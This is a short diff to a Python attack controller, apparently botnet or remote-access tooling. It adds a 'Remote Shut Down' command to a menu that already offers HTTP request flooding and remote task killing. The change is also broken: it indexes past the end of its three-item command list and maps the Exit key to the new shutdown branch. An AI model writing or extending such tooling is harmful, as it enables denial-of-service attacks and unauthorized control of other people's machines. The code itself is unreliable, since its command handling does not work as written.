@@ -98,6 +98,7 @@ def attackcommand():
     accepted_command = ["1","2","E"]
     print("[1] HTTP request Flood \n"
           "[2] Task Killing \n"
+          "[3] Remote Shut Down \n"
           "[E] Exit \n")
     type = input("What is your attack category? \n")[0]
 
@@ -110,6 +111,11 @@ def attackcommand():
         value = "2" + " " + str(processName)
         taskKill(value)
     elif accepted_command[2] == type:
+        value = "9"
+        ActualValue = type + value
+        print(ActualValue)
+        connection(ActualValue)
+    elif accepted_command[3] == type:
         print("Connection Closed")
     else:
         print("Invalid Command")
